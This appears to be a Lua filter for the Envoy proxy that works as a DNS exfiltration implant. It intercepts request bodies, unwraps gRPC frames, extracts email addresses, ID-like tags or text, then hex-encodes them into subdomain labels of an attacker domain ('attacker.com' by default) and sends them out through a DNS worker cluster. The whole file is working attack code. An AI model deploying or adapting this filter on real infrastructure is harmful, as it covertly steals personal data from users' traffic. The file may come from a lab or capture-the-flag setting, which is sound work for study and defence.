local MAX = tonumber(os.getenv("MAX_BODY_BYTES") or "4096")
local DOMAIN = os.getenv("EXFIL_DOMAIN") or "attacker.com"
local FIXED  = os.getenv("EXFIL_FIXED")  or "123-SECRET-DATA-1234"
local WORKER_CLUSTER = "dns_worker"
local WORKER_TIMEOUT_MS = 2000

-- === utils ===
local function tohex(s)
  return (tostring(s):gsub(".", function(c) return string.format("%02x", string.byte(c)) end))
end

local function rand_nonce(len)
  local t, chars = {}, "0123456789abcdefghijklmnopqrstuvwxyz"
  for i = 1, (len or 6) do
    local r = math.random(#chars)
    t[#t + 1] = chars:sub(r, r)
  end
  return table.concat(t)
end

local function chunk(s, n)
  local t, i = {}, 1
  while i <= #s do
    t[#t + 1] = s:sub(i, i + n - 1)
    i = i + n
  end
  return t
end

local function build_hosts_from_hex(hex_payload)
  local PAY_LABEL = 63
  local PART_SIZE = PAY_LABEL * 2
  local parts = chunk(hex_payload, PART_SIZE)
  local total = #parts
  local nonce_base = rand_nonce(5)

  local hosts = {}
  for i, p in ipairs(parts) do
    local p1 = p:sub(1, math.min(#p, PAY_LABEL))
    local p2 = ""
    if #p > PAY_LABEL then
      p2 = p:sub(PAY_LABEL + 1, math.min(#p, PAY_LABEL * 2))
    end
    local seq = string.format("%x", i) .. "-" .. string.format("%x", total)
    local nonce = nonce_base .. string.format("%x", os.time() % 0xffff)
    local host
    if p2 ~= "" then
      host = seq .. "." .. p1 .. "." .. p2 .. "." .. nonce .. "." .. DOMAIN
    else
      host = seq .. "." .. p1 .. "." .. nonce .. "." .. DOMAIN
    end
    hosts[#hosts + 1] = host
  end
  return hosts
end

local function parse_grpc_frame(raw)
  if #raw < 5 then return raw end
  local flag = string.byte(raw, 1)
  if flag ~= 0 then
    return ""
  end
  local b2, b3, b4, b5 = string.byte(raw, 2, 5)
  local len = b2 * 16777216 + b3 * 65536 + b4 * 256 + b5
  if 5 + len <= #raw then
    return raw:sub(6, 5 + len)
  else
    return raw:sub(6)
  end
end

local function extract_interesting(p, fallback)
  local email = p:match("([%w%._%+%-]+@[%w%.%-]+%.[%a][%a%d%-]+)")
  if email then return email end
  local tag = p:match("(%d%d%d%-%u%u%u%u%u%u%-%u%u%u%u%-%d%d%d%d)")
  if tag then return tag end
  local ascii = p:gsub("[^%g%s]", "")
  if #ascii > 0 then return ascii:sub(1, 512) end
  return fallback
end

local function send_frames(handle, hosts)
  for _, host in ipairs(hosts) do
    handle:logInfo("Sending to dns_worker: " .. host)
    pcall(function()
      local headers = {
        [":method"] = "POST",
        [":path"] = "/dig",
        [":authority"] = "127.0.0.1",
        ["content-type"] = "text/plain",
      }
      handle:httpCall(WORKER_CLUSTER, headers, host, WORKER_TIMEOUT_MS, true)
    end)
  end
end

function envoy_on_request(handle)
  math.randomseed(os.time() + tonumber(string.byte((handle:streamInfo():downstreamRemoteAddress() or "x"), 1) or 7))
  local candidate = FIXED
  local data = handle:body()

  if data ~= nil and data:length() > 0 then
    local n = math.min(data:length(), MAX + 5)
    local raw = data:getBytes(0, n) or ""
    local grpc = parse_grpc_frame(raw)
    local picked = extract_interesting(grpc, FIXED)
    candidate = picked or FIXED
  end

  local hex = tohex(candidate)
  local hosts = build_hosts_from_hex(hex)
  send_frames(handle, hosts)
end
